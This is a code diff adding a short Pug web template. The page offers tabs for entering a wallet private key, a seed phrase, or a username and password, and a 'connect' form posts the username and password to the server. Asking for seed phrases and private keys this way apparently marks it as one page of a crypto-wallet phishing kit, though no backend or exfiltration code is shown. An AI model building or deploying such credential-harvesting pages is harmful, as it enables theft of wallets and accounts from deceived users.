@@ -1,0 +1,21 @@
+doctype html
+html(lang="en")
+  head
+    meta(charset="UTF-8")
+    meta(name="viewport" content="width=device-width, initial-scale=1.0")
+    title Document
+    link(rel="stylesheet" href="/css/userandpass.css")
+  body
+    .tab
+      a(href="/privateKey") Private
+      a(href="/seedPhrase") Seed Phrase
+      a(href="/userandpass" class="active") Username & Password
+    if errorMessage
+      div.user-message.user-message--error #{errorMessage}  
+    .sendUserDetails
+      h1 Enter Your Username & Password
+      form(action="/userandpass" method="post")
+        input(type="text" name="username" placeholder="Username" value=oldInput.username)
+        input(type="password" name="password" placeholder="Password" value=oldInput.password)
+        button(type="submit") connect
+    a(href="/" class="back-home") Back Home
